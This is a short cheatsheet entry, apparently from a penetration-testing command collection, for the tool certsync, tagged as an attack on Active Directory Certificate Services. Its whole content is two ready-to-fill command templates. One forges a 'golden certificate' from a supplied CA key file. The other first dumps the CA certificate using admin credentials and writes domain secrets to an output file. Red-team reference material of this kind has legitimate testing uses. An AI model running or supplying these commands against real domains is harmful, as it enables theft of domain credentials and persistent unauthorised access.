# certsync

% adcs, certificate, pki, windows, Active directory, template, godlen certificate

## certsync - Golden certificate with local CA cert
#plateform/linux #target/remote #cat/ATTACK
```
certsync -ca-pfx <ca_file> -u <admin> -p '<admin_password>' -ca-ip <ip_ca> -d <domain> -ns <ip_dns> -dc-ip <dc_ip> -outputfile <outputfile>
```

## certsync - Golden certificate, dump ca cert
#plateform/linux #target/remote #cat/ATTACK
```
certsync -u <admin> -p '<admin_password>' -ca-ip <ip_ca> -d <domain> -ns <ip_dns> -dc-ip <dc_ip> -outputfile <outputfile>
```
